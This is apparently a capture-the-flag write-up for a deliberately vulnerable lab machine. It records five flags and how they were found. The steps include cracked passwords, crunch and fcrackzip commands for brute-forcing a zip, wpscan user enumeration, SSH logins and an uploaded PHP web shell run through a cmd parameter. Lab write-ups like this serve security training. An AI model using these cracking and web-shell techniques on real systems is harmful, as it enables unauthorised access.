```
flags:
------
5 flags to pwn the system

http://10.38.1.118/flag-numero-uno.txt 
Flag data: B34rcl4ws

http://10.38.1.118/prehistoricforest/index.php/2016/07/06/announcing-the-callahan-internal-company-blog/ - Flag #2: thisisthesecondflagyayyou.txt
http://10.38.1.118/prehistoricforest/thisisthesecondflagyayyou.txt
Flag data: Z4l1nsky

http://10.38.1.118:8008/NickIzL33t/flagtres.txt
Flag data: TinyHead

ssh bigtommysenior@10.38.1.118     password: fatguyinalittlecoat1938!!
Flag data: EditButton

create a php payload for rce. there is a writable directory in the server (found using ssh)
http://10.38.1.118:8008/NickIzL33t/P4TCH_4D4MS/uploads/shell.php?cmd=whoami
Flag data: Buttcrack
```

```
finale
------
put together the flags: B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
```


```
users found: Nick, Big Tom, Richard, company's president: Tom Callhan, Tommy, Michelle, Steve Jobs
```


```
interesting stuffs found:
-------------------------
Please restore the backup copy immediately. backup copy is in Big Tom's home folder
important information in the company blog. hid it in a folder named after the place: https://www.youtube.com/watch?v=VUxOd4CszJ8 - `prehistoric forest` , maybe in leet code
http://10.38.1.118/prehistoricforest/index.php/2016/07/07/son-of-a/ -  Erase “/prehistoricforest” and put “/richard” there instead. md5 hash found: cracked - spanky. can be user password - richard:spanky
http://10.38.1.118/prehistoricforest/index.php/2016/07/06/status-of-restoring-company-home-page/ - password protected , pass - spanky
http://10.38.1.118/prehistoricforest/index.php/2016/07/06/status-of-restoring-company-home-page/ - 'there’s a backup called callahanbak.bak that you can just rename to index.html'

the ftp server seems to go online at the top of the hour for 15 minutes, then down for 15 minutes, then up again, then down again.

I just reset my account (“nickburns” in case you’re dumb and can’t remember) - username and password for FTP server at port 65534.
found readme.txt - leet coded folder - NickIzL33t, most probably to be used in 8008 port http server
Big Tom's a moron and always forgets his passwords and so I made an encrypted .zip of his passwords and put them in the "NickIzL33t" folder as well

Big tom's password hints:
Your password is your wife's nickname "bev" (note it's all lowercase) plus the following:
* One uppercase character
* Two numbers
* Two lowercase characters
* One symbol - 
* The year Tommy Boy came out in theaters - 1995

crunch 13 13 -t bev,%%@@^1995 -o Dic.txt
fcrackzip -v -u -D -p Dic.txt t0msp4ssw0rdz.zip

correct pass : bevH00tr$1995

wpscan to find usernames : tom, richard, tommy, michelle , TomC , BigTommyC
wpscan to find correct pass of these usernames : tom:tomtom1

http://10.38.1.118/prehistoricforest/wp-admin/post.php?post=22&action=edit
found missing number of password of user bigtommysenior - 1938!!	 , complete password - fatguyinalittlecoat1938!!

after doing ssh, 'And you should now be able to restore the Callhan Web server to normal working status'. so we have to restore by moving the backup file to the server
```